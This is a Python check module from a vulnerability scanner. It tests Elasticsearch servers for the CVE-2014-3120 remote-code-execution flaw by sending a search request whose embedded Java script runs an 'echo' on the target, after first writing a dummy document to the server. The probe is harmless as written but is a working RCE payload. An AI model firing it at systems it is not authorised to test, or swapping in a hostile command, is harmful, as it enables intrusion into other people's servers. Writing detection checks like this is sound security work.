#!/usr/bin/env python
# -*- coding:utf-8 -*-

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'rce_cve20143120'
        self.info = "Check the Elasticsearch RCE CVE-2014-3120"
        self.keyword = ['all', 'elasticsearch', 'rce', 'web', 'intranet', 'danger', 'cve_2014_3120', '9200']
        self.default_ports_list = [9200,]
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        file_content = random8string()
        data_create = {"name" : "test4sec"}
        data = {"size": 1,"query": {"filtered": {"query": {"match_all": {}}}},"script_fields": {"command": {"script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"echo %s\").getInputStream()).useDelimiter(\"\\\\A\").next();"%(file_content)}}}
        url1_create = "http://%s:%d/website/blog/"%(ip, port) if add_web_path == "" else "http://%s:%d/%s/website/blog/"%(ip, int(port), add_web_path)
        url2_create = "https://%s:%d/website/blog/"%(ip, port) if add_web_path == "" else "https://%s:%d/%s/website/blog/"%(ip, int(port), add_web_path)
        url1 = "http://%s:%d/_search?pretty"%(ip, port) if add_web_path == "" else "http://%s:%d/%s/_search?pretty"%(ip, int(port), add_web_path)
        url2 = "https://%s:%d/_search?pretty"%(ip, port) if add_web_path == "" else "https://%s:%d/%s/_search?pretty"%(ip, int(port), add_web_path)
        try:
            req = Requester(url1_create, method='post', jsons=data_create)
        except RequesterOpenError:
            try:
                req = Requester(url2_create, method='post', jsons=data_create)
            except: pass
        except: pass

        try:
            req = Requester(url1, method='post', jsons=data)
            if file_content in str(req.html) and req.code == 200 and check_200_or_404(url1):
                result = "exists Elasticsearch RCE CVE-2014-3120"
                self._output(ip, port, result)
        except RequesterOpenError:
            try:
                req = Requester(url2, method='post', jsons=data)
                if file_content in str(req.html) and req.code == 200 and check_200_or_404(url2):
                    result = "exists Elasticsearch RCE CVE-2014-3120"
                    self._output(ip, port, result)
            except: pass
        except: pass

globals()['VulnChecker'] = VulnChecker